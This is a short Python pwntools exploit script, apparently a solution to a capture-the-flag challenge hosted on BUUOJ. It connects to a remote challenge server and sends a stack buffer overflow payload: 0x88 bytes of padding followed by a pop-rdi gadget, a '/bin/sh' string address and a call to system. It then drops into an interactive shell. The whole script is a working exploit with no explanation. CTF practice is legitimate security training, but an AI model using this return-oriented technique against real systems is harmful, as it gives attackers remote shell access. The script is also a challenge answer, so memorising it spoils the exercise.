from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28394)
elf = ELF('./pwn')

binsh_addr = 0x600a90
poprdi_ret = 0x4006b3

io.sendlineafter(b'Input:', cyclic(0x88) + p64(poprdi_ret) + p64(binsh_addr) + p64(elf.plt['system']))

io.interactive()